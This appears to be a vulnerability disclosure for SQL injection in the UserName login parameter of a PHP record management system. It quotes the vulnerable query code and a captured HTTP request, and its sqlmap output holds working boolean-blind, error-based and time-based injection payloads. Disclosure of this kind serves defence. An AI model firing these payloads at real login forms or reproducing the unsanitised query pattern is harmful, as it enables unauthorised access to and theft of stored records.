### VUL_AUTHOR:netmanzhang

# Record Management System - SQL Injection on (index.php UserName parameter) 

## Vendor Homepage:
https://www.sourcecodester.com/php/5107/record-management-system.html 

Version:V1.0

## Tested on: PHP, Apache, MySQL

## Affected Page:
index.php 

On this page, UserName parameter is vulnerable to SQL Injection Attack 

## Source code(Personnel_record_management_system/index.php):
```
$UserName=$_POST['UserName'];
$Password=$_POST['Password'];
$login_query=mysqli_query($conn,"select * from user where UserName='$UserName' and Password='$Password' and User_Type='Admin'");
$count=mysqli_num_rows($login_query);
```
## Proof of vulnerability(Verify using the sqlmap tool):
### Request:
```
POST /Personnel_record_management_system/index.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 134
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=52388hjgjeif4bl4r5sqp2bmpm
Origin: http://localhost
Referer: http://localhost/Personnel_record_management_system/index.php
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip

Login=&Password=admin&UserName=admin
```
### -> sqlmap -r 1.txt (above request package)--batch
### Output:
```
---
Parameter: UserName (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: Login=&Password=admin&UserName=admin' RLIKE (SELECT (CASE WHEN (3344=3344) THEN 0x61646d696e ELSE 0x28 END))-- yUhF

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: Login=&Password=admin&UserName=admin' AND (SELECT 1811 FROM(SELECT COUNT(*),CONCAT(0x7176786271,(SELECT (ELT(1811=1811,1))),0x7170767671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- qOMN

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: Login=&Password=admin&UserName=admin' AND (SELECT 7314 FROM (SELECT(SLEEP(5)))RspW)-- zsho
---
```
